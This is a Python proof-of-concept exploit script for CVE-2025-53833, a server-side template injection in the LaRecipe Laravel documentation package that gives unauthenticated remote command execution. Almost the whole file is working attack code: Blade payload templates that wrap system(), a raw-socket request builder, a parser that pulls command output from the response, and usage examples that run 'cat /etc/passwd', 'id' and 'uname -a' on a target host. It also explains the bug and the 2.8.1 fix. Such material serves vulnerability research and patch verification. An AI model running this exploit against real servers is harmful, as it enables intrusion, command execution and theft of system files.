#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : LaRecipe Server-Side Template Injection to RCE
# CVE            : CVE-2025-53833
# Vendor         : BinaryTorch
# Product        : LaRecipe
# Affected       : All versions < 2.8.1
# Type           : CWE-1336 - Improper Neutralization of Template Engine
# CVSS           : 10.0 (Critical)
# Platform       : PHP / Laravel
# Author         : Exploit Intelligence Platform (dev@exploit-intel.com)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-26
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-53833: LaRecipe SSTI to RCE via Blade Template Injection

Demonstrates unauthenticated Remote Code Execution in BinaryTorch LaRecipe
versions < 2.8.1 through Server-Side Template Injection (SSTI).

VULNERABILITY SUMMARY:
  In src/Models/Documentation.php line 100, the replaceLinks() method injects
  the raw HTTP request URI (including the query string) into HTML content that
  is subsequently compiled by Laravel's Blade template engine and executed via
  eval(). An attacker can inject Blade directives (e.g., {{system('id')}})
  through the query string to achieve arbitrary command execution.

ATTACK CHAIN:
  1. GET /docs/{version}/{page}?{{system('COMMAND')}}
  2. replaceLinks() calls request()->getRequestUri(), which includes the query string
  3. The injected Blade directive {{ system('COMMAND') }} is embedded in the HTML
  4. renderBlade() -> Blade::compileString() -> eval() executes the injected code
  5. Command output appears in the HTTP response within <a href="..."> attributes

FIX:
  v2.8.1 replaces getRequestUri() with getPathInfo(), which excludes the query string.

Usage:
  python3 poc.py <target_host> [port] [command]
  python3 poc.py 172.20.0.2 8000 id
  python3 poc.py 172.20.0.2 8000 "cat /etc/passwd"
  python3 poc.py 172.20.0.2 8000 "uname -a"

References:
  - https://github.com/saleem-hadad/larecipe/security/advisories/GHSA-jv7x-xhv2-p5v2
  - https://github.com/saleem-hadad/larecipe/commit/c1d0d56889655ce5f2645db5acf0e78d5fc3b36b
"""

import sys
import socket
import re
import textwrap
import urllib.parse


# Default configuration for the lab environment
DEFAULT_HOST = "172.20.0.2"
DEFAULT_PORT = 8000
DEFAULT_CMD = "id"
DOCS_PATH = "/docs/1.0/overview"

# Blade SSTI payload templates
# Simple: {{ system('CMD') }} → Blade compiles to: <?php echo e(system('CMD')); ?>
# system() both executes the command and outputs stdout, and e() HTML-encodes the result
PAYLOAD_SIMPLE = "{{{{system('{cmd}')}}}}"

# URL-safe: For commands with spaces/special chars, URL-encode the command and wrap in
# PHP's urldecode() so the server decodes it before execution. This avoids spaces in
# the HTTP request line (which would break HTTP parsing).
# {{ system(urldecode('CMD_URLENCODED')) }}
PAYLOAD_URLSAFE = "{{{{system(urldecode('{cmd_encoded}'))}}}}"

# Regex to extract command output from the response HTML
# The output appears inside anchor href attributes between the query string and #fragment:
#   <a href="/docs/1.0/overview?<CMD_OUTPUT>\n<CMD_OUTPUT>#section-name">
# system() outputs to stdout (captured by Blade's output buffer) AND returns the last line
# (echoed by Blade's {{ }} echo syntax), so the output appears twice
OUTPUT_PATTERN = re.compile(
    r'href="' + re.escape(DOCS_PATH) + r'\?(.*?)#',
    re.DOTALL
)


def raw_http_get(host, port, path, timeout=15):
    """
    Send a raw HTTP GET request using a TCP socket.

    We use raw sockets instead of http.client because:
    1. Python 3.13+ http.client validates URLs and rejects spaces/special chars
    2. The SSTI payload contains { } characters that must be sent raw (not URL-encoded)
    3. Commands with spaces (e.g., "uname -a") need raw spaces in the URL
    4. This matches real-world exploitation where raw HTTP is crafted

    getRequestUri() returns the raw URI as received from the web server,
    so the exact bytes we send are what get injected into the template.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))

    # Craft raw HTTP/1.1 request
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"User-Agent: CVE-2025-53833-PoC/1.0\r\n"
        f"Accept: text/html\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    sock.sendall(request.encode("utf-8"))

    # Read full response
    response_data = b""
    while True:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            response_data += chunk
        except socket.timeout:
            break

    sock.close()

    # Parse HTTP response
    response_text = response_data.decode("utf-8", errors="replace")

    # Split headers and body
    header_end = response_text.find("\r\n\r\n")
    if header_end == -1:
        return None, response_text

    headers = response_text[:header_end]
    body = response_text[header_end + 4:]

    # Extract status code from first line: "HTTP/1.1 200 OK"
    status_line = headers.split("\r\n")[0]
    try:
        status_code = int(status_line.split(" ")[1])
    except (IndexError, ValueError):
        status_code = None

    return status_code, body


def build_exploit_url(command):
    """
    Build the exploit URL with SSTI payload in the query string.

    The payload uses Blade's {{ }} echo syntax to inject a system() call.
    Curly braces { } must be sent as raw bytes — NOT URL-encoded —
    because getRequestUri() returns the raw URI and Blade needs literal {{ }}.

    For commands with spaces or special characters (e.g., "uname -a", "cat /etc/passwd"):
    - Spaces in the HTTP request line would break HTTP parsing
    - We URL-encode the command and wrap it in PHP's urldecode()
    - getRequestUri() returns the raw URI with %XX encoding
    - Blade compiles: {{ system(urldecode('uname%20-a')) }}
    - PHP executes: system(urldecode('uname%20-a')) → system('uname -a')

    For simple commands without special chars (e.g., "id", "whoami"):
    - Use the simple payload without urldecode() overhead
    """
    # Check if command needs URL encoding (contains spaces or special chars)
    needs_encoding = any(c in command for c in ' &|;<>$`\\!"#%')

    if needs_encoding:
        # URL-encode the command, then use urldecode() in PHP to restore it
        cmd_encoded = urllib.parse.quote(command, safe='')
        payload = PAYLOAD_URLSAFE.format(cmd_encoded=cmd_encoded)
    else:
        # Simple payload — no encoding needed
        payload = PAYLOAD_SIMPLE.format(cmd=command)

    url = f"{DOCS_PATH}?{payload}"
    return url


def send_exploit(host, port, command, verbose=False):
    """
    Send the exploit request and return (status_code, response_body).

    Uses raw TCP sockets to send the HTTP request, ensuring that:
    - Blade directives {{ }} are sent as raw bytes
    - Command arguments with spaces are preserved
    - No URL encoding is applied to the payload
    """
    url = build_exploit_url(command)

    if verbose:
        print(f"[*] Target: {host}:{port}")
        print(f"[*] Payload URL: {url}")
        print(f"[*] Sending exploit request...")

    try:
        status, body = raw_http_get(host, port, url)

        if verbose and status:
            print(f"[*] HTTP Status: {status}")

        return status, body

    except ConnectionRefusedError:
        print(f"[!] Connection refused to {host}:{port}")
        print(f"[!] Is the LaRecipe container running?")
        return None, None
    except socket.timeout:
        print(f"[!] Connection timed out to {host}:{port}")
        return None, None
    except OSError as e:
        print(f"[!] Network error: {e}")
        return None, None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None, None


def extract_command_output(response_body, command):
    """
    Extract the command output from the HTML response.

    When the SSTI succeeds, the command output is embedded in anchor link
    href attributes. system() both prints to stdout (captured by output buffer)
    and returns the last line (printed by Blade echo), so output appears twice.

    Example response fragment:
      <a href="/docs/1.0/overview?uid=0(root) gid=0(root) groups=0(root)
      uid=0(root) gid=0(root) groups=0(root)#installation">
    """
    matches = OUTPUT_PATTERN.findall(response_body)
    if not matches:
        return None

    # Each anchor link with "#" in the original doc will have the output injected.
    # Take the first match and extract the command output.
    raw_output = matches[0].strip()

    if not raw_output:
        return None

    # system() output appears twice (stdout + return value echo'd by Blade)
    # Split by newline and deduplicate trailing duplicate line
    lines = raw_output.split("\n")
    if len(lines) >= 2 and lines[-1].strip() == lines[-2].strip():
        lines = lines[:-1]

    # Clean up and join
    output = "\n".join(line.strip() for line in lines if line.strip())
    return output if output else None


def verify_not_vulnerable(response_body):
    """
    Check if the response indicates the target is NOT vulnerable (patched).

    On a patched instance, getPathInfo() is used instead of getRequestUri(),
    so the query string payload is NOT injected into the HTML. The anchor
    links will have clean hrefs like: href="/docs/1.0/overview#section"
    """
    clean_pattern = re.compile(
        r'href="' + re.escape(DOCS_PATH) + r'#'
    )
    return bool(clean_pattern.search(response_body))


def exploit(host, port, command, verbose=False):
    """
    Execute the full exploit chain against the target.

    Steps:
      1. Verify target is reachable and has anchor links (required trigger)
      2. Send SSTI payload via query string
      3. Parse response to extract command output
      4. Report success/failure with clear indicators
    """
    print("=" * 70)
    print(f"  CVE-2025-53833 — LaRecipe SSTI → RCE PoC")
    print(f"  Target: http://{host}:{port}")
    print(f"  Command: {command}")
    print("=" * 70)
    print()

    # Step 1: Verify the target is reachable and serves LaRecipe docs
    print("[1] Checking target availability...")
    try:
        status, baseline_body = raw_http_get(host, port, DOCS_PATH, timeout=10)

        if status != 200:
            print(f"    [-] Target returned HTTP {status} (expected 200)")
            print(f"    [-] The documentation endpoint may not be available")
            return False

        # Check if the page contains anchor links (required for the exploit)
        if '"#' not in baseline_body:
            print(f"    [-] No anchor links found in the documentation page")
            print(f"    [-] The vulnerability requires anchor links (href=\"#...\") to trigger")
            return False

        print(f"    [+] Target is up — HTTP 200, anchor links present")
        print()

    except Exception as e:
        print(f"    [-] Cannot reach target: {e}")
        return False

    # Step 2: Send the SSTI exploit payload
    needs_encoding = any(c in command for c in ' &|;<>$`\\!"#%')
    if needs_encoding:
        print(f"[2] Sending SSTI payload: {{{{system(urldecode('{urllib.parse.quote(command, safe='')}'))}}}}")
    else:
        print(f"[2] Sending SSTI payload: {{{{system('{command}')}}}}")
    url = build_exploit_url(command)
    print(f"    URL: GET {url}")
    print()

    status, body = send_exploit(host, port, command, verbose=verbose)

    if status is None:
        print("    [-] Exploit request failed (connection error)")
        return False

    if status == 500:
        print(f"    [!] HTTP 500 — Server error (possible payload syntax issue)")
        print(f"    [!] The Blade compilation may have failed")
        return False

    print(f"    [*] Response: HTTP {status}")
    print()

    # Step 3: Extract command output from the response
    print("[3] Analyzing response for command output...")

    cmd_output = extract_command_output(body, command)

    if cmd_output:
        print(f"    [+] VULNERABLE! Command output extracted:")
        print()
        for line in cmd_output.split("\n"):
            print(f"        {line}")
        print()
        print(f"    [+] Server-Side Template Injection confirmed — RCE achieved!")
        print(f"    [+] The Blade directive was compiled and eval()'d by PHP")
        return True
    else:
        # Check if the target appears patched
        if verify_not_vulnerable(body):
            print(f"    [-] NOT VULNERABLE — Target appears to be patched (v2.8.1+)")
            print(f"    [-] Anchor links use getPathInfo() (path only, no query string)")
            print(f"    [-] The SSTI payload was NOT injected into the template")
            return False
        else:
            print(f"    [?] Inconclusive — no command output detected")
            print(f"    [?] The target may be patched, or the payload format may need adjustment")
            return False


def main():
    """Parse arguments and run the exploit."""
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    command = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CMD

    # Check for --help
    if host in ("-h", "--help"):
        print(textwrap.dedent(f"""\
            Usage: {sys.argv[0]} [host] [port] [command]

            CVE-2025-53833 PoC — LaRecipe SSTI to RCE

            Positional arguments:
              host      Target hostname or IP (default: {DEFAULT_HOST})
              port      Target port (default: {DEFAULT_PORT})
              command   OS command to execute (default: {DEFAULT_CMD})

            Examples:
              {sys.argv[0]}
              {sys.argv[0]} 172.20.0.2 8000 id
              {sys.argv[0]} 172.20.0.2 8000 "cat /etc/passwd"
              {sys.argv[0]} 172.20.0.2 8000 "uname -a"
              {sys.argv[0]} localhost 8081 whoami
        """))
        sys.exit(0)

    # Run the exploit
    success = exploit(host, port, command, verbose=False)

    print()
    if success:
        print("[✓] RESULT: VULNERABLE — CVE-2025-53833 confirmed")
        sys.exit(0)
    else:
        print("[✗] RESULT: NOT VULNERABLE or exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
